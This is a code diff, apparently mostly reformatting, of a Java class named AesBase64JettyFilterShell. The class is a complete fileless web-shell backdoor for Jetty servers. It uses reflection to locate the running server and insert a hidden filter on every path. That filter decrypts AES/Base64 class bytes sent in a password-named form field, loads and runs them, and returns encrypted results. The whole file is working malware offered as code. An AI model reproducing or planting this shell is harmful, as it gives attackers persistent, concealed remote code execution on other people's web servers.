@@ -3,7 +3,7 @@ import java.lang.reflect.*;
 import java.util.*;
 
 //jetty7-10.11 test
-public class AesBase64JettyFilterShell extends ClassLoader implements InvocationHandler{
+public class AesBase64JettyFilterShell extends ClassLoader implements InvocationHandler {
     private static boolean initialized = false;
     private static final Object lock = new Object();
     private static Class payloadClass;
@@ -15,13 +15,13 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
         new AesBase64JettyFilterShell();
     }
 
-    public AesBase64JettyFilterShell(ClassLoader loader){
+    public AesBase64JettyFilterShell(ClassLoader loader) {
         super(loader);
     }
 
-    public AesBase64JettyFilterShell(){
-        synchronized (lock){
-            if (!initialized){
+    public AesBase64JettyFilterShell() {
+        synchronized (lock) {
+            if (!initialized) {
                 initialized = true;
                 try {
                     Class servletRequestFilterClass = null;
@@ -34,18 +34,18 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
 
                         }
                     }
-                    if (servletRequestFilterClass !=null){
-                        addFilter(Proxy.newProxyInstance(servletRequestFilterClass.getClassLoader(),new Class[]{servletRequestFilterClass},this),servletRequestFilterClass);
+                    if (servletRequestFilterClass != null) {
+                        addFilter(Proxy.newProxyInstance(servletRequestFilterClass.getClassLoader(), new Class[]{servletRequestFilterClass}, this), servletRequestFilterClass);
                     }
-                }catch (Throwable e){
+                } catch (Throwable e) {
 
                 }
             }
         }
     }
 
-    public Class loadClasses(String className) throws ClassNotFoundException {
-        ArrayList<ClassLoader> classLoaders = new ArrayList<>();
+    private Class loadClasses(String className) throws ClassNotFoundException {
+        ArrayList classLoaders = new ArrayList();
         classLoaders.add(this.getClass().getClassLoader());
         try {
             classLoaders.add(Thread.currentThread().getContextClassLoader());
@@ -56,16 +56,16 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
             for (int i = 0; i < threadCount; i++) {
                 classLoaders.add(threads[i].getContextClassLoader());
             }
-        }catch (Exception e){
+        } catch (Exception e) {
 
         }
         int loaders = classLoaders.size();
         for (int i = 0; i < loaders; i++) {
-            ClassLoader loader = classLoaders.get(i);
-            if (loader!=null){
+            ClassLoader loader = (ClassLoader) classLoaders.get(i);
+            if (loader != null) {
                 try {
-                    return Class.forName(className,true,loader);
-                }catch(Throwable e){
+                    return Class.forName(className, true, loader);
+                } catch (Throwable e) {
 
                 }
             }
@@ -74,9 +74,9 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
     }
 
 
-    public static Object[] getServers() throws Throwable {
+    private static Object[] getServers() throws Throwable {
         HashSet contexts = new HashSet();
-        HashSet<String> blackType = new HashSet<String>();
+        HashSet blackType = new HashSet();
         blackType.add(int.class.getName());
         blackType.add(short.class.getName());
         blackType.add(long.class.getName());
@@ -94,36 +94,37 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
         blackType.add(Character.class.getName());
         blackType.add(Boolean.class.getName());
         blackType.add(String.class.getName());
-        Object jettyServer = searchObject("org.eclipse.jetty.server.Server",Thread.currentThread(),new HashSet(),blackType,10,0);
+        Object jettyServer = searchObject("org.eclipse.jetty.server.Server", Thread.currentThread(), new HashSet(), blackType, 10, 0);
         if (jettyServer != null) {
             try {
-                Object serverHandle = getFieldValue(jettyServer,"_handler");
+                Object serverHandle = getFieldValue(jettyServer, "_handler");
                 Object handles = serverHandle.getClass().getMethod("getChildHandlers").invoke(serverHandle);
                 if (handles.getClass().isArray()) {
                     int handleSize = Array.getLength(handles);
                     for (int i = 0; i < handleSize; i++) {
-                        Object handle = Array.get(handles,i);
-                        if (handle!=null && "org.eclipse.jetty.webapp.WebAppContext".equals(handle.getClass().getName())){
+                        Object handle = Array.get(handles, i);
+                        if (handle != null && "org.eclipse.jetty.webapp.WebAppContext".equals(handle.getClass().getName())) {
                             contexts.add(handle);
                         }
                     }
                 }
-            }catch (Throwable e){
+            } catch (Throwable e) {
 
             }
         }
         return contexts.toArray();
     }
-    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDepth,int currentDepth)throws Throwable {
+
+    private static Object searchObject(String targetClassName, Object object, HashSet blacklist, HashSet blackType, int maxDepth, int currentDepth) throws Throwable {
         currentDepth++;
 
-        if (currentDepth >= maxDepth){
+        if (currentDepth >= maxDepth) {
             return null;
         }
 
-        if (object != null){
+        if (object != null) {
 
-            if (targetClassName.equals(object.getClass().getName())){
+            if (targetClassName.equals(object.getClass().getName())) {
                 return object;
             }
 
@@ -131,14 +132,14 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
             if (!blacklist.contains(hash)) {
                 blacklist.add(new Integer(hash));
                 Field[] fields = null;
-                ArrayList<Field> fieldsArray = new ArrayList();
+                ArrayList fieldsArray = new ArrayList();
                 Class objClass = object.getClass();
-                while (objClass != null){
+                while (objClass != null) {
                     Field[] fields1 = objClass.getDeclaredFields();
                     fieldsArray.addAll(Arrays.asList(fields1));
                     objClass = objClass.getSuperclass();
                 }
-                fields = fieldsArray.toArray(new Field[0]);
+                fields = (Field[]) fieldsArray.toArray(new Field[0]);
 
 
                 for (int i = 0; i < fields.length; i++) {
@@ -147,29 +148,29 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
                     try {
                         field.setAccessible(true);
                         Class fieldType = field.getType();
-                        if (!blackType.contains(fieldType.getName())){
+                        if (!blackType.contains(fieldType.getName())) {
                             Object fieldValue = field.get(object);
-                            if (fieldValue != null){
+                            if (fieldValue != null) {
                                 Object ret = null;
-                                if (fieldType.isArray()){
-                                    if (!blackType.contains(fieldType.getComponentType().getName())){
+                                if (fieldType.isArray()) {
+                                    if (!blackType.contains(fieldType.getComponentType().getName())) {
                                         int arraySize = Array.getLength(fieldValue);
                                         for (int j = 0; j < arraySize; j++) {
-                                            ret = searchObject(targetClassName,Array.get(fieldValue,j),blacklist,blackType,maxDepth,currentDepth);
-                                            if (ret!= null){
+                                            ret = searchObject(targetClassName, Array.get(fieldValue, j), blacklist, blackType, maxDepth, currentDepth);
+                                            if (ret != null) {
                                                 break;
                                             }
                                         }
                                     }
-                                }else{
-                                    ret = searchObject(targetClassName,fieldValue,blacklist,blackType,maxDepth,currentDepth);
+                                } else {
+                                    ret = searchObject(targetClassName, fieldValue, blacklist, blackType, maxDepth, currentDepth);
                                 }
-                                if (ret!= null){
+                                if (ret != null) {
                                     return ret;
                                 }
                             }
                         }
-                    }catch (Throwable e){
+                    } catch (Throwable e) {
 
                     }
                 }
@@ -179,28 +180,28 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
 
     }
 
-    private boolean addFilter(Object filter,Class filterClass) throws Throwable {
+    private boolean addFilter(Object filter, Class filterClass) throws Throwable {
         boolean isOk = false;
         try {
             Object[] obj = getServers();
             for (int i = 0; i < obj.length; i++) {
                 Object webappContext = obj[i];
                 try {
-                    Object servletHandler = getFieldValue(webappContext,"_servletHandler");
-                    Class filterHolderClass = Class.forName("org.eclipse.jetty.servlet.FilterHolder",true,servletHandler.getClass().getClassLoader());
-                    Class filterMappingClass = Class.forName("org.eclipse.jetty.servlet.FilterMapping",true,servletHandler.getClass().getClassLoader());
+                    Object servletHandler = getFieldValue(webappContext, "_servletHandler");
+                    Class filterHolderClass = Class.forName("org.eclipse.jetty.servlet.FilterHolder", true, servletHandler.getClass().getClassLoader());
+                    Class filterMappingClass = Class.forName("org.eclipse.jetty.servlet.FilterMapping", true, servletHandler.getClass().getClassLoader());
                     Constructor filterHolderConstructor = filterHolderClass.getConstructor(filterClass);
                     Object filterHolder = filterHolderConstructor.newInstance(filter);
                     Object filterMapping = filterMappingClass.newInstance();
-                    Method setFilterHolderMethod = filterMappingClass.getDeclaredMethod("setFilterHolder",filterHolderClass);
+                    Method setFilterHolderMethod = filterMappingClass.getDeclaredMethod("setFilterHolder", filterHolderClass);
                     setFilterHolderMethod.setAccessible(true);
-                    setFilterHolderMethod.invoke(filterMapping,filterHolder);
-                    filterMappingClass.getMethod("setPathSpecs",String[].class).invoke(filterMapping,new Object[]{new String[]{"/*"}});
+                    setFilterHolderMethod.invoke(filterMapping, filterHolder);
+                    filterMappingClass.getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{"/*"}});
 
-                    servletHandler.getClass().getMethod("addFilter",filterHolderClass).invoke(servletHandler,filterHolder);
-                    servletHandler.getClass().getMethod("prependFilterMapping",filterMappingClass).invoke(servletHandler,filterMapping);
+                    servletHandler.getClass().getMethod("addFilter", filterHolderClass).invoke(servletHandler, filterHolder);
+                    servletHandler.getClass().getMethod("prependFilterMapping", filterMappingClass).invoke(servletHandler, filterMapping);
                     isOk = true;
-                }catch (Throwable e) {
+                } catch (Throwable e) {
 
                 }
             }
@@ -214,85 +215,85 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
 
 
     public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
-        if (method.getName().equals("doFilter")){
+        if (method.getName().equals("doFilter")) {
             Object servletRequest = args[0];
             Object servletResponse = args[1];
             Object filterChain = args[2];
-            if (!run(servletRequest,servletResponse)){
-                filterChain.getClass().getMethod("doFilter").invoke(servletRequest,servletResponse);
+            if (!run(servletRequest, servletResponse)) {
+                filterChain.getClass().getMethod("doFilter").invoke(servletRequest, servletResponse);
             }
         }
         return null;
     }
-
-    private Object invokeMethod(Object obj,String methodName,Object... parameters){
+    private Object invokeMethod(Object obj, String methodName, Object... parameters) {
         try {
             ArrayList classes = new ArrayList();
-            if (parameters!=null){
-                for (int i=0;i<parameters.length;i++){
-                    Object o1=parameters[i];
-                    if (o1!=null){
+            if (parameters != null) {
+                for (int i = 0; i < parameters.length; i++) {
+                    Object o1 = parameters[i];
+                    if (o1 != null) {
                         classes.add(o1.getClass());
-                    }else{
+                    } else {
                         classes.add(null);
                     }
                 }
             }
-            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));
+            Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[]{}));
 
             return method.invoke(obj, parameters);
-        }catch (Exception e){
+        } catch (Exception e) {
 //        	e.printStackTrace();
         }
         return null;
     }
 
-    private Method getMethodByClass(Class cs,String methodName,Class... parameters){
-        Method method=null;
-        while (cs!=null){
+    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
+        Method method = null;
+        while (cs != null) {
             try {
-                method=cs.getMethod(methodName, parameters);
-                cs=null;
-            }catch (Exception e){
-                cs=cs.getSuperclass();
+                method = cs.getMethod(methodName, parameters);
+                cs = null;
+            } catch (Exception e) {
+                cs = cs.getSuperclass();
             }
         }
         return method;
     }
 
-    public static Field getField(Object obj, String fieldName){
+    private static Field getField(Object obj, String fieldName) {
         Class clazz = null;
 
-        if(obj == null){
+        if (obj == null) {
             return null;
         }
 
-        if (obj instanceof Class){
-            clazz = (Class)obj;
-        }else {
+        if (obj instanceof Class) {
+            clazz = (Class) obj;
+        } else {
             clazz = obj.getClass();
         }
         Field field = null;
-        while (clazz!=null){
+        while (clazz != null) {
             try {
                 field = clazz.getDeclaredField(fieldName);
                 clazz = null;
-            }catch (Exception e){
+            } catch (Exception e) {
                 clazz = clazz.getSuperclass();
             }
         }
 
-        if (field != null){
+        if (field != null) {
             field.setAccessible(true);
         }
 
         return field;
     }
-    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field f=null;
-        if (obj instanceof Field){
-            f=(Field)obj;
-        }else {
+
+    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
+        Field f = null;
+        if (obj instanceof Field) {
+            f = (Field) obj;
+        } else {
             f = getField(obj, fieldName);
         }
         if (f != null) {
@@ -300,92 +301,107 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
         }
         return null;
     }
-    public String getParameter(Object requestObject,String name) {
+
+    private String getParameter(Object requestObject, String name) {
         return (String) invokeMethod(requestObject, "getParameter", name);
     }
-    public String getContentType(Object requestObject) {
+
+    private String getContentType(Object requestObject) {
         return (String) invokeMethod(requestObject, "getContentType");
     }
 
 
-    public byte[] aes(byte[] s,boolean m){
-        try{
-            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
-            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(key.getBytes(),"AES"));
+    private byte[] aes(byte[] s, boolean m) {
+        try {
+            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
+            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES"));
             return c.doFinal(s);
-        }catch (Exception e){
+        } catch (Exception e) {
             return null;
         }
     }
 
-    public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }
+    private static String md5(String s) {
+        String ret = null;
+        try {
+            java.security.MessageDigest m;
+            m = java.security.MessageDigest.getInstance("MD5");
+            m.update(s.getBytes(), 0, s.length());
+            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
+        } catch (Exception e) {
+        }
+        return ret;
+    }
 
-    public static String base64Encode(byte[] bs) throws Exception {
+    private static String base64Encode(byte[] bs) throws Exception {
         Class base64;
         String value = null;
         try {
             base64 = Class.forName("java.util.Base64");
             Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
-            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[] {
+            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{
                     byte[].class
-            }).invoke(Encoder, new Object[] {
+            }).invoke(Encoder, new Object[]{
                     bs
             });
         } catch (Exception e) {
             try {
                 base64 = Class.forName("sun.misc.BASE64Encoder");
                 Object Encoder = base64.newInstance();
-                value = (String) Encoder.getClass().getMethod("encode", new Class[] {
+                value = (String) Encoder.getClass().getMethod("encode", new Class[]{
                         byte[].class
-                }).invoke(Encoder, new Object[] {
+                }).invoke(Encoder, new Object[]{
                         bs
                 });
-            } catch (Exception e2) {}
+            } catch (Exception e2) {
+            }
         }
         return value;
     }
-    public static byte[] base64Decode(String bs) throws Exception {
+
+    private static byte[] base64Decode(String bs) throws Exception {
         Class base64;
         byte[] value = null;
         try {
             base64 = Class.forName("java.util.Base64");
             Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
-            value = (byte[]) decoder.getClass().getMethod("decode", new Class[] {
+            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{
                     String.class
-            }).invoke(decoder, new Object[] {
+            }).invoke(decoder, new Object[]{
                     bs
             });
         } catch (Exception e) {
             try {
                 base64 = Class.forName("sun.misc.BASE64Decoder");
                 Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[] {
+                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{
                         String.class
-                }).invoke(decoder, new Object[] {
+                }).invoke(decoder, new Object[]{
                         bs
                 });
-            } catch (Exception e2) {}
+            } catch (Exception e2) {
+            }
         }
         return value;
     }
 
-    private boolean run(Object request, Object response)  {
+    private boolean run(Object request, Object response) {
         try {
             try {
                 String contentType = getContentType(request);
-                if (contentType!=null && contentType.contains("application/x-www-form-urlencoded")) {
-                    String value = getParameter(request,password);
-                    if (value!=null){
+                if (contentType != null && contentType.contains("application/x-www-form-urlencoded")) {
+                    String value = getParameter(request, password);
+                    if (value != null) {
                         byte[] data = base64Decode(value);
                         data = aes(data, false);
-                        if (data != null && data.length > 0){
+                        if (data != null && data.length > 0) {
                             if (payloadClass == null) {
                                 ClassLoader loader = Thread.currentThread().getContextClassLoader();
                                 if (loader == null) {
                                     loader = request.getClass().getClassLoader();
                                 }
 
-                                payloadClass =  new AesBase64JettyFilterShell(loader).defineClass(data,0,data.length);
+                                payloadClass = new AesBase64JettyFilterShell(loader).defineClass(data, 0, data.length);
                             } else {
                                 java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                                 Object f = payloadClass.newInstance();
@@ -394,8 +410,8 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
                                 f.equals(data);
                                 f.toString();
                                 String md5 = md5(password + key);
-                                if (arrOut.size()>0) {
-                                    PrintWriter printWriter = (PrintWriter) invokeMethod(response,"getWriter");
+                                if (arrOut.size() > 0) {
+                                    PrintWriter printWriter = (PrintWriter) invokeMethod(response, "getWriter");
                                     printWriter.write(md5.substring(0, 16));
                                     printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
                                     printWriter.write(md5.substring(16));
@@ -406,9 +422,9 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
                     }
                 }
 
-            }catch (Throwable ignored){
+            } catch (Throwable ignored) {
             }
-        }catch (Throwable ignored){
+        } catch (Throwable ignored) {
 
         }
         return false;
